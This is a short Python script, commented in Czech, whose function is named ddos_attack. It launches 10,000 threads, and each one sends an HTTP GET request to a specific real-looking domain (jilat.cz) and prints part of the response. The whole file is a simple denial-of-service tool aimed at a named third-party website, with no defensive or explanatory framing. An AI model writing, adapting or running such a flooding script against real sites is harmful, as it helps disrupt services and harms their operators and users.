import requests
import threading

def ddos_attack():
    url = "https://jilat.cz"
    try:
        response = requests.get(url)
        print(f'Status: {response.status_code}, Response: {response.text[:200]}')  # Zobrazí prvních 200 znaků odpovědi
    except requests.exceptions.RequestException as e:
        print(f'Request failed: {e}')

def main():
    num_threads = 10000  # Snížený počet vláken pro lepší přehled
    threads = []

    for i in range(num_threads):
        t = threading.Thread(target=ddos_attack)
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
